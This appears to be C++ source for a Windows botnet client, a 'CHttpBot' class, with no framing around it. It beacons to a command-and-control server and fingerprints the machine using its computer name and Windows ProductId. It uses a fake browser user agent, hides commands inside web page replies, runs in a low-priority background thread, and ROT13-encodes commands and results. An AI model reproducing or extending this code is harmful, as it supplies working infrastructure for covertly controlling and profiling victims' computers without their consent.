#include "stdafx.h"

//table to encrypt/decrypt transfered data
static unsigned char szRot13Table[] = 
{
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 
    0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 
    0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20, 0x21, 0x22, 0x23, 
    0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f, 
    0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3b, 
    0x3c, 0x3d, 0x3e, 0x3f, 0x40, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 
    0x55, 0x56, 0x57, 0x58, 0x59, 0x5a, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 
    0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 
    0x60, 0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 
    0x79, 0x7a, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 
    0x6b, 0x6c, 0x6d, 0x7b, 0x7c, 0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82, 0x83, 
    0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f, 
    0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9a, 0x9b, 
    0x9c, 0x9d, 0x9e, 0x9f, 0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5, 0xa6, 0xa7, 
    0xa8, 0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf, 0xb0, 0xb1, 0xb2, 0xb3, 
    0xb4, 0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba, 0xbb, 0xbc, 0xbd, 0xbe, 0xbf, 
    0xc0, 0xc1, 0xc2, 0xc3, 0xc4, 0xc5, 0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xcb, 
    0xcc, 0xcd, 0xce, 0xcf, 0xd0, 0xd1, 0xd2, 0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 
    0xd8, 0xd9, 0xda, 0xdb, 0xdc, 0xdd, 0xde, 0xdf, 0xe0, 0xe1, 0xe2, 0xe3, 
    0xe4, 0xe5, 0xe6, 0xe7, 0xe8, 0xe9, 0xea, 0xeb, 0xec, 0xed, 0xee, 0xef, 
    0xf0, 0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 
    0xfc, 0xfd, 0xfe, 0xff
};

CHttpBot::CHttpBot()
{
	//init variables to 0
	strcpy(szOriginalUrl, "");
	strcpy(szBuffer, "");	
	strcpy(szUrl, "");
	for(int i=0; i<MAX_COMMANDS_IN_QUEUE; i++)strcpy(szCommands[i], "");
	for(int i=0; i<MAX_RESULTS_IN_QUEUE; i++)strcpy(szResults[i], "");

	iTimeout=0;
}

void CHttpBot::AddResultToSend(char *szResultData)
{
	char szTemp[2048]="";

	strcpy(szTemp, szResultData);
	
	//check for some empty string, to add if for sending
	for(int i=0; i<MAX_RESULTS_IN_QUEUE; i++)
	{
		if(szResults[i][0]==0)
		{
			//encrypt data with ROT13
			for(int c=0; c<(int)strlen(szTemp); c++)
			{
				szTemp[c]=szRot13Table[szTemp[c]];
			}

			strcpy(szResults[i], szTemp);
			break;
		}
	}
}

bool CHttpBot::GetCommandFromQueue(char *szCommandBuffer)
{
	//get next command from queue, fail if no command is available
	for(int i=0; i<MAX_COMMANDS_IN_QUEUE; i++)
	{
		if(szCommands[i][0]!=0)
		{
			strcpy(szCommandBuffer, szCommands[i]);
			szCommands[i][0]=0;
			return true;
		}
	}

	return false;
}

bool CHttpBot::GetLineFromBuffer(char *szBuffer, char *szLine)
{
	char szTemp[4096]="";

	strcpy(szTemp, szBuffer);
	
	//parse the whole buffer and split the first line of it
	for(int i=0; i<(int)strlen(szTemp); i++)
	{
		szLine[i]=szTemp[i];
		szLine[i+1]=0;

		if(szTemp[i]==10)
		{
			szLine[i]=0;
			strcpy(szBuffer, szTemp+i+1);

			return true;
		}
	}

	return false;
}

void CHttpBot::ParseDataFromServer(char *szBuffer)
{
	char szLine[512]="";

	//get all lines from the buffer
	while(GetLineFromBuffer(szBuffer, szLine))
	{
		//check if line is a html-tag or bot command
		if(szLine[0]!='<' && szLine[(int)strlen(szLine)-1]!='>')
		{
			for(int i=0; i<MAX_COMMANDS_IN_QUEUE; i++)
			{
				//add bot command to queue if there is one free string
				if(szCommands[i][0]==0)
				{
					strcpy(szCommands[i], szLine);

					//decrypt command with ROT13
					for(int c=0; c<(int)strlen(szCommands[i]); c++)
					{
						szCommands[i][c]=szRot13Table[szCommands[i][c]];
					}

					break;
				}
			}
		}
	}
}

void CHttpBot::SetTimeout(int iTimeoutMilliseconds)
{
	//set timeout for the thread to reuqest new data from the server
	iTimeout=iTimeoutMilliseconds;
}

void CHttpBot::SetServerUrl(char *szServerUrl)
{
	//init the server url
	strcpy(szOriginalUrl, szServerUrl);
}

void CHttpBot::MessageHandler(void)
{
	//login to server, always at startup
	//bot recieves here not data
	strcpy(szUrl, szOriginalUrl);
	AddGUID(szUrl);
	AddRequestData(szUrl, "meta", "login");
	RequestDataFromServer(szUrl, szBuffer);
	memset(szBuffer, 0, 4096);

	while(1)
	{
		//build the new reuqest string
		strcpy(szUrl, szOriginalUrl);
		AddGUID(szUrl);
		memset(szBuffer, 0, 4096);
		AddRequestData(szUrl, "meta", "data");

		//add result to send
		for(int i=0; i<MAX_RESULTS_IN_QUEUE; i++)
		{
			if(szResults[i][0]!=0)
			{
				AddRequestData(szUrl, "res", szResults[i]);
				szResults[i][0]=0;
				break;
			}
		}

		//send request + results
		RequestDataFromServer(szUrl, szBuffer);

		//parse answer from server including the new commands
		if(strcmp(szBuffer, "")!=0)
		{
			ParseDataFromServer(szBuffer);
		}

		Sleep(iTimeout);
	}
}

void CHttpBot::StartMessageHandling(void)
{
	//start the message handling thread
	hThread = CreateThread(0, 0, &MessageHandlerThreadProc, this, 0, &dwThreadId);
	SetThreadPriority(hThread, THREAD_PRIORITY_BELOW_NORMAL);
}

DWORD WINAPI CHttpBot::MessageHandlerThreadProc(LPVOID lpCHttpBot)
{
	CHttpBot *CTemp = (CHttpBot *)lpCHttpBot;

	//call the message handler of the class, so access to class members is easier
	CTemp->MessageHandler();

	return 0;
}

void CHttpBot::AddGUID(char *szUrl)
{
	char szTemp[512]="";
	DWORD dwSize=512, dwType;
	HKEY hKey;

	//this function gets the computer name and windows serial as a global uniquie identifier
	//maybe there is some better way to do it so, but i think this is enough :)
	
	GetComputerName(szTemp, &dwSize);

	strcat(szUrl, "?q=");
	strcat(szUrl, szTemp);

	dwSize=512;

	szTemp[0]=0;

	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey)==ERROR_SUCCESS)
	{
		RegQueryValueEx(hKey, "ProductId", NULL, &dwType, (LPBYTE)szTemp, &dwSize);

		RegCloseKey(hKey);
	}
	else
	{
		if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion", 0, KEY_READ, &hKey)==ERROR_SUCCESS)
		{
			RegQueryValueEx(hKey, "ProductId", NULL, &dwType, (LPBYTE)szTemp, &dwSize);

			RegCloseKey(hKey);
		}
	}

	strcat(szUrl, "&hl=");
	strcat(szUrl, szTemp);
}

void CHttpBot::AddRequestData(char *szUrl, char *szDataName, char *szData)
{
	//add some query strings to the request line
	strcat(szUrl, "&");
	strcat(szUrl, szDataName);
	strcat(szUrl, "=");
	strcat(szUrl, szData);
}

void CHttpBot::RequestDataFromServer(char *szUrl, char *szServerAnswer)
{
	HINTERNET hInet, hUrl;
	char szTemp[4096]="";
	DWORD dwBytesRead, dwBytesInBuffer=0;

	//use standard windows api functions for http requests
	hInet = InternetOpen("Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.8.0.8) Gecko/20061025", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

	if(hInet!=NULL)
	{
		hUrl = InternetOpenUrl(hInet, szUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);

		if(hUrl!=NULL)
		{
			//open the  url
			InternetReadFile(hUrl, szTemp, 512, &dwBytesRead);

			//get all data of the site and write it to the buffer
			while(dwBytesRead>0)
			{
				memcpy(szServerAnswer+dwBytesInBuffer, szTemp, dwBytesRead);
				dwBytesInBuffer+=dwBytesRead;

				InternetReadFile(hUrl, szTemp, 512, &dwBytesRead);
			}

			//clean all up ;)
			InternetCloseHandle(hUrl);
		}

		InternetCloseHandle(hInet);
	}
}